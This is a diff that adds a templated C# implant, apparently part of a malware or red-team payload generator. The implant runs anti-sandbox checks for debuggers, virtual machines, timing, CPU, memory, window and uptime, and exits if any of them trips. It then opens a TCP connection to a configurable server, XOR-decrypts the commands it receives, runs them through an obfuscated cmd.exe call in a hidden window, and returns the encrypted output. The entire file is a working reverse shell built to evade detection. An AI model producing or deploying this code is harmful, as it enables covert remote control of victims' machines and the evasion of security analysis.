@@ -1,0 +1,258 @@
+using System;
+using System.Diagnostics;
+using System.Linq;
+using System.Management; 
+using System.Runtime.InteropServices;
+using System.Net.Sockets;
+using System.Text;
+
+namespace {{ implant.name }}
+{
+    class Program
+    {	
+		
+	    {% if anti_sandbox.enabled %}
+		[DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+		private static extern IntPtr GetForegroundWindow();
+
+		[DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+		private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
+        static bool IsSandbox()
+        {
+            try 
+            {
+                {% for check in anti_sandbox.checks %}
+                
+                {% if check.type == "debugger" %}
+                if (Debugger.IsAttached || System.Diagnostics.Debugger.IsLogging())
+                {
+                    return true;
+                }
+                {% endif %}
+
+                {% if check.type == "vm" %}
+                using (var searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
+                {
+                    foreach (var item in searcher.Get())
+                    {
+                        string manufacturer = item["Manufacturer"].ToString().ToLower();
+                        string model = item["Model"].ToString().ToLower();
+                        if (manufacturer.Contains("vmware") || 
+                            model.Contains("virtualbox") ||
+                            manufacturer.Contains("xen") ||
+                            manufacturer.Contains("qemu"))
+                        {
+                            return true;
+                        }
+                    }
+                }
+                {% endif %}
+				
+
+                {% if check.type == "sleep" %}
+                long start = Environment.TickCount;
+                System.Threading.Thread.Sleep(2000);
+                if (Environment.TickCount - start < 1900) 
+                {
+                    return true;
+                }
+                {% endif %}
+
+                {% if check.type == "cpu" %}
+				if (Environment.ProcessorCount < {{ check.min_cores }})
+				{
+					return true;
+				}
+				{% endif %}
+
+				{% if check.type == "memory" %}
+				var memCounter = new System.Diagnostics.PerformanceCounter("Memory", "Available Bytes");
+				float totalMemGB = memCounter.NextValue() / 1024f / 1024f / 1024f;
+				if (totalMemGB < {{ check.min_gb }})
+				{	
+					return true;
+				
+				}
+				{% endif %}
+				{% if check.type == "API" %}
+				
+				
+
+				try
+				{
+					var sb = new StringBuilder(256);
+					if (GetWindowText(GetForegroundWindow(), sb, sb.Capacity) == 0 || 
+					string.IsNullOrEmpty(sb.ToString()))
+					{
+						return true;
+					}
+				}
+				catch
+				{
+					return true;
+				}
+				{% endif %}
+				
+				{% if check.type == "systemUptimeInSeconds" %}
+				using (var uptime = new PerformanceCounter("System", "System Up Time"))
+				{
+					float first_timer = uptime.NextValue();
+					float uptimeSeconds = uptime.NextValue(); 
+					
+					if (uptimeSeconds < {{ check.time_sec }})
+					{
+						return true;
+					}
+				}
+				{% endif %}
+				{% endfor %}
+				
+                
+                return false;
+            }
+            catch { return false; } 
+        }
+        {% endif %}
+		
+	
+		static byte[] GetKey() 
+        {
+            
+            string part1 = "{{ security.key_part1 }}";  
+            string part2 = "{{ security.key_part2 }}";  
+            string part3 = "{{ security.key_part3 }}";  
+            string part4 = "{{ security.key_part4 }}";
+            string part5 = "{{ security.key_part5 }}";  
+            string part6 = "{{ security.key_part6 }}"; 			
+            
+             
+            return Encoding.UTF8.GetBytes(part1 + part2 + part3 + part4 + part5 + part6);
+        }
+		
+		
+		{% if random_garbage.enabled %}
+		const string RANDOM_SUFFIX = "{{ random_garbage.random }}"; 
+		static string res = "var_" + RANDOM_SUFFIX;
+		
+		{% endif %}
+        
+        static byte[] key = GetKey();
+
+        static void Main(string[] args)
+        {
+		
+			{% if anti_sandbox.enabled %}
+            if (IsSandbox())
+            {
+                Environment.Exit(0); 
+                
+            }
+            {% endif %}
+			
+			{% if random_garbage.enabled %}
+			Random random = new Random();
+			int r_num = random.Next(0,{{random_garbage.random_num}});
+			string str = r_num.ToString();
+			string full_res = res + str;
+			//Console.WriteLine(full_res);
+            {% endif %}
+			
+            string serverAddress = "{{ network.proxy_addr }}";
+            int serverPort = {{ network.proxy_port }};
+
+            try
+            {
+                using (TcpClient client = new TcpClient(serverAddress, serverPort))
+                {
+                    //Console.WriteLine("Connected to server.");
+
+                    using (NetworkStream stream = client.GetStream())
+                    {
+                        byte[] buffer = new byte[4096];
+                        while (true)
+                        {
+                            
+                            int bytesRead = stream.Read(buffer, 0, buffer.Length);
+                            if (bytesRead == 0)
+                            {
+                                //Console.WriteLine("Server closed the connection.");
+                                break;
+                            }
+
+                            
+                            byte[] decryptedCtrl = Enx(buffer, bytesRead);
+                            string ctrl = Encoding.UTF8.GetString(decryptedCtrl, 0, decryptedCtrl.Length).Trim();
+                            //Console.WriteLine(String.Format("Received ctrl: {0}", ctrl));
+
+                            
+                            string output = E_ctrl(ctrl);
+
+                            
+                            byte[] encryptedResponse = Enx(Encoding.UTF8.GetBytes(output));
+                            stream.Write(encryptedResponse, 0, encryptedResponse.Length);
+                        }
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine(String.Format("Error: {0}", ex.Message));
+            }
+        }
+
+        static string E_ctrl(string ctrl)
+        {
+            try
+            {
+                Process temp = new Process(), pro = ((temp != null) ? temp : new Process());
+				string fileName = string.Concat(
+				(char)(new Random().Next(99, 100)), 
+				(char)(110-1), 
+				(char)(130-30), 
+				'.', 
+				(char)(116-15), 
+				(char)(122-2), 
+				(char)(112-11)
+				);
+                pro.StartInfo.FileName = fileName;
+                pro.StartInfo.Arguments = String.Format("/C {0}", ctrl);
+                pro.StartInfo.RedirectStandardOutput = true;
+                pro.StartInfo.RedirectStandardError = true;
+                pro.StartInfo.UseShellExecute = false;
+                pro.StartInfo.CreateNoWindow = true;
+
+                pro.Start();
+
+                string output = pro.StandardOutput.ReadToEnd();
+                string error = pro.StandardError.ReadToEnd();
+
+                pro.WaitForExit();
+
+                return string.IsNullOrEmpty(error) ? output : error;
+            }
+            catch (Exception ex)
+            {
+                return String.Format("Error executing : {0}", ex.Message);
+            }
+        }
+
+        
+        static byte[] Enx(byte[] data)
+        {
+            return Enx(data, data.Length);
+        }
+
+        static byte[] Enx(byte[] data, int length)
+        {
+            int keySize = key.Length;
+            byte[] result = new byte[length];
+
+            for (int i = 0; i < length; i++)
+            {
+                result[i] = (byte)(data[i] ^ key[i % keySize]);
+            }
+
+            return result;
+        }
+    }
+}
